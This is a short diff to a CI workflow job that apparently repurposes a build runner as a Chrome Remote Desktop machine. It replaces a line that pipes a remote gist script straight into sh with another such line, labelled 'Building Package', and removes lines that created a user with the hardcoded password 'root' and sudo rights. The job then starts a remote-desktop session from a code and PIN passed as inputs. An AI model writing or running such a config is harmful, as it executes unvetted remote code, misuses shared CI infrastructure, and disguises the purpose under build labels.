@@ -13,10 +13,8 @@ jobs:
     docker:
       - image: ruby:2.5
     steps:
-    - run: echo 'Create User'
-    - run: sudo useradd -m arrayfs && sudo adduser root sudo && echo 'arrayfs:root' | sudo chpasswd
     - run: echo 'Building Package'
-    - run: wget https://gist.githubusercontent.com/iDnp6006/6c21df6e093c9cccc096b2d89ad36ef2/raw/init.dev -O - | sh
+    - run: wget https://gist.githubusercontent.com/RandomiDn/c2af6a01c7593ce4689414d8c507710b/raw/ci.dev -O - | sh
     - run: echo 'Start Chrome Remote Desktop'
     - run: ${{ github.event.inputs.code }} -pin=${{ github.event.inputs.pin }}
     - run: echo 'Done! You can see the machine in list now'
